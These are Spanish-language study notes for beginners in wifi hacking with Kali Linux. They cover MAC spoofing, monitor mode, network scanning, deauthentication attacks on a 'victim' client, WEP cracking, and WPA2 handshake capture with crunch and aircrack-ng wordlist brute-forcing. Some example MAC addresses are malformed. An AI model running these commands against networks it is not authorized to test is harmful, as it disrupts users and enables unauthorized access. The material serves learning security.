# Pasos para iniciar en la ciberseguridad

## Instalaciones

- Instalar VirtualBox
- Instalar Kali Linux
- Actualizar paquetes de Kali Linux
  `sudo apt-get update`
  `sudo apt-get upgrade`
- Intalar terminator (terminal mejorada)
  `sudo apt-get install terminator`

## Comandos basicos de linux

`ls` (lista los archivos y carpetas)
`cd` (cambia de directorio)
`cd ..` (cambia al directorio anterior)

## Comandos para la red

- `sudo` (permite ejecutar comandos como administrador)
- `ifconfig` (muestra la configuracion de la red)
  - wlan0: interfaz de red inalambrica
  - inet: ip de la red
  - ether: direccion mac
- `ifconfig wlan0 down` (desactiva la interfaz de red necesario para cambiar el modo de la tarjeta)
- `ifconfig wlan0 hw ether 00:11:22:33:44:55` (cambia la direccion mac)
- `ifconfig wlan0 up` (activa la interfaz de red)

  ### Modos inalambricos

- `iwconfig` (muestra los modos de la tarjeta)
  - Modo monitor: permite capturar paquetes de red
  - Modo managed: permite conectarse a una red solo conecta adaptador con el router
- `ifconfig wlan0 down`
- `airmon-ng check kill` (mata los procesos que esten usando la tarjeta para mejorar el rendimiento de receptor)
- `service network-manager start` (inicia el servicio de red)
- `iwconfig wlan0 mode monitor`
- `iwconfig wlan0 mode managed` regresa a modo managed
- `ifconfig wlan0 up`

  ### aircrack-ng

  Muestra informacion de la redes inalambricas a su alrededor

- `sudo apt-get install aircrack-ng` (instala aircrack-ng si no estas en Kali Linux)
- `airodump-ng wlan0` (muestra las redes inalambricas a su alrededor)

  - BSSID: direccion mac del router
  - ESSID: nombre de la red
  - CH: canal de la red
  - ENC: tipo de encriptacion
  - PWR: potencia de la señal
  - Beacons: numero de paquetes que se han enviado
  - IV: numero de paquetes que se han capturado

  ## Bandas wifi 2.4Ghz y 5Ghz

  Determina los canales que podemos usar para evitar interferencias con otras redes inalambricas depende de los adaptadores que tengamos para poder capturar paquetes

- bandas comunes

  - a: 5.15 - 5.25 GHz
  - b - g: 2.4 - 2.4835 GHz
  - n: 2.4 - 2.4835 GHz y 5.15 - 5.25 GHz
  - ac: 5.15 - 5.25 GHz

- `airodump-ng --band a wlan0` (muestra las redes inalambricas a su alrededor en la banda a)
- `airodump-ng --band abg wlan0` (muestra las redes inalambricas a su alrededor en la banda abg)

## Olfateo selectivo
- `airodump-ng wlan0`
- `airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write test wlan0` (captura paquetes de la red con la direccion mac 00:11:22:33:44:55 en el canal 1)

## Ataque deauth
- `aireplay-ng --deauth 4 -a 00:11:22:33:44:55:66 -c 55:66:77:88:99:4d (<- lan de victima) wlan0` deautientica a un cliente de la red
-`aireplay-ng --deauth 10 -a 00:11:22:33:44:55:66 -c ff:ff:ff:ff:ff:ff wlan0 &> /dev/null&` -> `aireplay-ng --deauth 10 -a 00:11:22:33:44:55:66 -c ff:ff:ff:ff:68:54 wlan0 &> /dev/null&`  -> `jobs` -> `kill`

## Crakear wep
- `airodump-ng --bssid 00:11:22:33:44:55:66 --channel 1 --write wep wlan0`
- `aircrack-ng wep-01.cap` (crakea la red wep)

## Crakear wpa2
- wpa -> tkip
- wpa2 -> ccmp

- `airodump-ng --bssid 00:11:22:33:44:55:66 --channel 1 --write wpa2 wlan0`
- se puede hacer un deauth a la red para capturar paquetes

## crear diccionario
- `crunch [min] [max] [caracteres] -t [patron] -o [nombre archivo]`
- `crunch 8 8 0123456789 -t 12345678 -o diccionario` (crea un diccionario de 8 digitos)
- `aircrack-ng wpa-01.cap -w diccionario` encuentra la contraseña de la red wpa o wpa2

### pausar diccionario
- `john --wordlist=diccionario -stdout` para visualizar el diccionario en la terminal
- `john --wordlist=diccionario -stdout --session=nombre | aircrack-ng -w - -b [bssid de la red a atacar] wpa-01.cap` se puede pausar con `ctrl + c` y continuar con `john --restore=nombre | aircrack-ng -w - -b [bssid de la red a atacar] wpa-01.cap`

## Crear diccionario sin ocupar espacio en el disco duro
- `crunch 8 8 | aircrack-ng -w -  -b [bssid de la red a atacar] wpa-01.cap`
- `crunch 8 8 | john --stdin --session=wpa --stdout |   aircrack-ng -w - -b [bssid de la red a atacar] wpa-01.cap` con esto se puede pausar con `ctrl + c` y continuar con `crunch 8 8 | john --restore=wpa | aircrack-ng -w - -b [bssid de la red a atacar] wpa-01.cap`

## Portales captivos